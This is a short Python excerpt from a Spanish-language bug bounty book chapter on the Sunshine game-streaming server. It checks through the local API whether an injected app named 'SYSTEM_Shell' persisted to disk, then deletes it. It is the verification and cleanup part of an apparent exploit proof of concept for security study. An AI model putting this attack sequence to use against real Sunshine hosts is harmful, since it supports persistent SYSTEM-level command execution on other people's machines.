# Extraído de: LibroBugBounty/cap-24-caso-sunshine.md
# Verificar que la app se persistio
req = urllib.request.Request(
    "https://localhost:47990/api/apps",
    headers=headers
)
with urllib.request.urlopen(req, context=ctx) as resp:
    apps = json.loads(resp.read())
    injected = any(a.get("name") == "SYSTEM_Shell"
                   for a in apps.get("apps", []))
    print(f"Persistido en disco: {injected}")

# Limpiar: eliminar la app inyectada
for i, app in enumerate(apps.get("apps", [])):
    if app.get("name") == "SYSTEM_Shell":
        req = urllib.request.Request(
            f"https://localhost:47990/api/apps/{i}",
            method="DELETE",
            headers=headers,
        )
        urllib.request.urlopen(req, context=ctx)
        print(f"App eliminada del indice {i}")
